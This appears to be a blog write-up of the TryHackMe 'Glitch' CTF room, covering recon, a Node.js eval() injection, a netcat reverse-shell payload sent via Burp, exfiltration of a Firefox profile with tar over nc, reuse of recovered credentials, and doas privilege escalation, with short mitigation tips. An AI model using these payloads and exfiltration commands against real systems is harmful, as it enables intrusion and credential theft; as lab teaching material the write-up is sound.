+++
author = "v801"
title = "Glitch"
date = "2022-08-07"
tags = [
    "appsec",
    "burp",
    "ctf",
    "ffuf",
    "javascript",
    "nmap",
    "node",
    "reverse shell",
    "rce",
    "tryhackme"
]
+++

A challenge showcasing vulnerable web app exploitation and simple privilege escalation.
<!--more-->

## Intro

[Glitch](https://tryhackme.com/room/glitch) is a challenge room on [THM](http://tryhackme.com) that's described by the author as "a simple challenge in which you need to exploit a vulnerable web application and root the machine".  

Glitch was a lot of fun so I wanted to share my experience running through it.  This post contains spoilers for the room so if you haven't done it yet :space_invader: You've been warned. :space_invader:

For this challenge I'm using a basic Ubuntu desktop with Firefox and some tools like curl, base64, find, netcat, nmap, ffuf and Burp/FoxyProxy.

### First moves
After waiting for the box to spin up, the first thing that we can do is run a port scan. Using nmap we'll run the command `nmap -A -T4 [ip]`.  In this post the reference to `[target-ip]` is the challenge box, and `[attacker-ip]` is ours.

Here is the output from the command, including my pumpkin prompt.
```none
🎃 nmap -A -T4 [target-ip]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-06 16:40 MDT
Nmap scan report for [target-ip]
Host is up (0.17s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 23.44 seconds
```

The scan shows us port 80 is open, it's a http serivce and it's running nginx.

```none
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

Port 80 is commonly known as the HTTP port and nginx is a common HTTP server. So with that we should check out the host in a web browser.  

![Glitch_Page1](https://user-images.githubusercontent.com/32247825/183269523-e5c94f84-355e-4d0e-b279-80dabfa19789.png)
Loading the host in browser brings us to a page titled `not allowed` with a glitchy looking background image.

The first thing I want to do is look through the page source and DOM nodes using Firefox Devtools to see if there's anything of interest.  The HTML layout of the page doesn't have anything in it but an interesting block of javascript.

```javascript
function getAccess() {
    fetch('/api/access')
        .then((response) => response.json())
        .then((response) => {
            console.log(response);
        });
    }
```

This api endpoint at `/api/access` seems interesting and it also appears that the function `getAccess()` never actually runs.  We should pop open the browser console and run that function to see what the response is.

```none
token=dGhpc19pc19ub3RfcmVhbA==
```

Neat.  Running `getAccess()` in the browser console gives us this key value pair.  Navigating to the full url as `http://[target-ip]/api/access` displays the token for us as well.  The value looks like a regular base64 encoded string so let's decode it.

```none
🎃 echo dGhpc19pc19ub3RfcmVhbA==|base64 -d
this_is_not_real
```

Echoing out and piping into base64 decode gives us our first flag for the challenge.

### Cookie Monsters

We have a token but what do we do with it?  Looking at the cookies storage tab in Firefox Devtools, there's a cookie entry called `token`. How about we try putting our decoded token in there?  

![Glitch_DevtoolsToken](https://user-images.githubusercontent.com/32247825/183269876-3913516a-6b63-4c7f-a4c3-6f4f6ac47408.png)

Let's refresh the page after swapping our token with the generic value. :space_invader:

![Glitch_Page2](https://user-images.githubusercontent.com/32247825/183268360-86a7d2ed-d64f-453f-9cc4-06b27083586e.jpg)
Reloading the host brings up a new page with a real artsy design.

Nice! Entering the token and refreshing the page gives us access to a new page now.  This new page layout has a bunch of dom elements on it so let's take a look through all of it for any interesting code or links to anything else.  

At the bottom of the page there's a script tag pointing to `js/script.js`.  Let's see if there's anything interesting in there.

Hitting the debugger tab to pull up the `script.js` file shows us this:

```javascript
(async function () {
  const container = document.getElementById('items');
  await fetch('/api/items')
    .then((response) => response.json())
```

The path in the code looks like another api endpoint.  This time at `/api/items`.  We could run a web url fuzzer on this host to see if it will find anything for us too.  I like to use [ffuf](https://github.com/ffuf/ffuf) with a common list from [seclists](https://gitlab.com/kalilinux/packages/seclists/-/blob/kali/master/Discovery/Web-Content/common.txt):

```none
🎃 ffuf -w common.txt -u http://[target-ip]/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://[target-ip]/FUZZ
 :: Wordlist         : FUZZ: common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

img                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 169ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 166ms]
secret                  [Status: 200, Size: 724, Words: 199, Lines: 33, Duration: 163ms]
:: Progress: [4593/4593] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```

Looks like a secret path at `http://[target-ip]/secret`.  Let's see what it pulls up.

![firefox_wUkVP78Le4](https://user-images.githubusercontent.com/32247825/183269353-84a26b88-81d0-4244-a50c-150e15cdaa65.jpg)
Heading over to that URL brings us to a page that just has a background image with bunny rabbits that say "mad". Nothing in the page source looks to be of use so this feels like an intentional dead end.  Well then! :rabbit:

We still haven't looked at `/api/items` much yet so let's do that.  Just like the last api endpoint, visiting `http://[target-ip]/api/items` gets us a response.  We can also see the response by fetching the endpoint in the browser console with javascript.

```javascript
fetch('/api/items').then((response) => console.log(response))
```

Another simple way is to use `curl` with the `-X` flag.

```none
🎃 curl -X GET http://[target-ip]/api/items
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
```

Possibly the edgiest curl of my life.  That seems to work fine but what about if we try a POST request instead of a GET request?  Let's see.

```
🎃 curl -X POST http://[target-ip]/api/items
{"message":"there_is_a_glitch_in_the_matrix"}
```

Well that's something.  Have you seen the Animatrix? Anyways, at this point what we could try is fuzzing through the api endpoint to see if we can find more or if existing ones take parameters we don't know about yet.  

After trying url fuzzing with ffuf again, the host did not reveal any new api endpoint URLs besides the first two we already know about.  

Now would be a good time to test if our `api/items` endpoint has any params it takes.  For this we can use `ffuf` again to fuzz through possible query params.

```none
🎃 ffuf -w common.txt -X POST -u "http://[target-ip]/api/items?FUZZ=test" -mc all -fs 45

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://[target-ip]/api/items?FUZZ=test
 :: Wordlist         : FUZZ: common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 45
________________________________________________

Documents and Settings  [Status: 502, Size: 182, Words: 7, Lines: 8, Duration: 161ms]
Program Files           [Status: 502, Size: 182, Words: 7, Lines: 8, Duration: 164ms]
cmd                     [Status: 500, Size: 1081, Words: 55, Lines: 11, Duration: 163ms]
reports list            [Status: 502, Size: 182, Words: 7, Lines: 8, Duration: 163ms]
:: Progress: [4593/4593] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```

The output shows that `cmd` query is getting a status response!  Let's post to it and see what happens.

```none
🎃 curl -X POST http://[target-ip]/api/items\?cmd\=test
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: test is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```

Awesome.  It appears the `cmd` query is trying to run a javascript `eval()` on the value we're passing it.  :space_invader:



Time to look up some reverse shell payloads for netcat! :cat:  [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd) has a good one we can try.

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker-ip] [port] >/tmp/f
```

We have to supply our own ip and listening port for netcat to reach us with this payload.  We also are going to need to wrap it so the node server will execute the code.  We can do this with `child_process.exec()` ([link](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback)).  We can pass a command that will get executed in a shell spawned by the process.

```javascript
require("child_process").exec("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker-ip] [port] >/tmp/f")
```

Now let's pass this into the api query.  It'll throw an error if we don't URL encode it first, so using Burp for this works great.

Crafting and sending a request is really easy with Burp Suite so that is what I'll be using.  We can turn on a proxy and capture the requests with Burp and FoxyProxy extension for Firefox.  With the proxy set for `127.0.0.1` and the Burp intercept turned on, we can load the host ip in our browser to capture a raw request body.  

```none
GET / HTTP/1.1
Host: [target-ip]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=this_is_not_real
Upgrade-Insecure-Requests: 1
If-None-Match: W/"6e3-y+mlEbLwniKG8z0CvYDjgSkn4ZQ"
```

Now we can disable the intercept/proxy and send the raw request to Repeater.  In Repeater we can easily edit the request to try out our payload as POST instead of GET.  Being familiar with the Repeater in Burp was super helpful for this.  

Using URL-encode 'key characters' on the exec command in our final payload makes it ready to be submitted in a post request otherwise it'll throw an error.

```none
POST /api/items?cmd=require("child_process").exec("rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+[attacker-ip]+[port]+>/tmp/f") HTTP/1.1
```

To open a connection with netcat we need to start a listener on our end.

```none
🎃 nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Now let's send over our payload with Burp.  
*click*

```none
🎃 nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on [ip] 33310
/bin/sh: 0: can't access tty; job control turned off
$
```

Our payload request worked and now we have shell access as `user`. :space_invader: 

```none
$ whoami
user
```

The challenge says we're looking for the contents of `user.txt`.  We can use the find command to look for the file by name.  Using `-print 2>/dev/null` sends permission denied spam away running it on the root directory `/`.

```none
$ find / -iname "user.txt" -print 2>/dev/null
/home/user/user.txt
```

We have located the file and let's see what's inside.

```none
$ cat /home/user/user.txt
THM{i_don't_know_why}
```

There's our second flag. :confetti_ball:

### PrivEsc

The challenge says we need to find the contents of `root.txt`.  Doing the same find command for this doesn't return anything that we have permission to access atleast.  We have to look around some more.

Running `ls` on `/home` shows it has 2 users in it.

```none
$ ls -lha /home
total 16K
drwxr-xr-x  4 root root 4.0K Jan 15  2021 .
drwxr-xr-x 24 root root 4.0K Jan 27  2021 ..
drwxr-xr-x  8 user user 4.0K Aug  7 07:55 user
drwxr-xr-x  2 v0id v0id 4.0K Jan 21  2021 v0id
```

Unfortunately the user `v0id` has nothing useful for us.

```none
$ ls -lha /home/v0id
total 12K
drwxr-xr-x 2 v0id v0id 4.0K Jan 21  2021 .
drwxr-xr-x 4 root root 4.0K Jan 15  2021 ..
lrwxrwxrwx 1 root root    9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r-- 1 v0id v0id 3.7K Jan 15  2021 .bashrc
```

Our user, `user` does have something interesting for us to look at.  The `.firefox` directory typically holds Firefox user profile data.  There could be something useful in there.

```none
$ ls -lha /home/user
total 16M
drwxr-xr-x   8 user user 4.0K Aug  7 07:55 .
drwxr-xr-x   4 root root 4.0K Jan 15  2021 ..
lrwxrwxrwx   1 root root    9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--   1 user user 3.7K Apr  4  2018 .bashrc
drwx------   2 user user 4.0K Jan  4  2021 .cache
drwxrwxrwx   4 user user 4.0K Jan 27  2021 .firefox
drwx------   3 user user 4.0K Jan  4  2021 .gnupg
drwxr-xr-x 270 user user  12K Jan  4  2021 .npm
drwxrwxr-x   5 user user 4.0K Aug  7 03:55 .pm2
drwx------   2 user user 4.0K Jan 21  2021 .ssh
-rw-rw-r--   1 user user   22 Jan  4  2021 user.txt
```

Let's pull down the `.firefox` directory with netcat.  First we'll open a listener on our end to extract the directory as a tarball.

```none
🎃 nc -l 9999|tar xf -
```

Then on our target machine we can move into the Firefox user data directory and tar it and pipe it thru to our netcat listener.

```none
$ cd /home/user/.firefox
$ tar cf - .|nc [attacker-ip] 9999
```

Now that we have the Firefox profile we can load it up like this:

```none
firefox --profile .firefox/b5w4643p.default-release
```

Looking into `about:logins` we can see some user login info. :space_invader:

```
username v0id
password love_the_void
```

It's possible these creds work for their system login but I got stuck here for a moment when trying to login as user `v0id`.  Since we're in an interactive shell only, using stuff like `su` doesn't work.

After looking around online I found really cool command to upgrade our shell to a full one.

```none
/usr/bin/script -qc /bin/bash /dev/null
user@ubuntu:~$
```

Now we have a full shell.  Let's check if our info from Firefox works now.

```none
user@ubuntu:/home/user$ su v0id
su v0id
Password: love_the_void

v0id@ubuntu:~$
```

We're now logged in as user `v0id` from the data we found in the Firefox profile.  Time to see if the user has any `sudo` access.

```none
v0id@ubuntu:/home/user$ sudo ls -la /root
sudo ls -la /root
[sudo] password for v0id: love_the_void

v0id is not in the sudoers file.  This incident will be reported.
```

Since we aren't on the sudoers list, we have to look around for other options to escalate privileges.  Looking around online for a bit for alternatives to `sudo` revealed something I'm not familiar with called `doas`.  This command `doas -u root /bin/bash` may get us what we need.

```none
v0id@ubuntu:/home/user$ doas -u root /bin/bash
doas -u root /bin/bash
Password: love_the_void

root@ubuntu:/home/user#
```

We now have root!  And with that

```none
root@ubuntu:/var/web# cat /root/root.txt
cat /root/root.txt
THM{diamonds_break_our_aching_minds}
```

The final flag. :space_invader::space_invader::space_invader:

### Mitigation

Avoid using javascript `eval()` function to parse any sort of user input.  
Limit API request types for all requests.  
Don't share the same password between a website and linux system.  
Disable doas.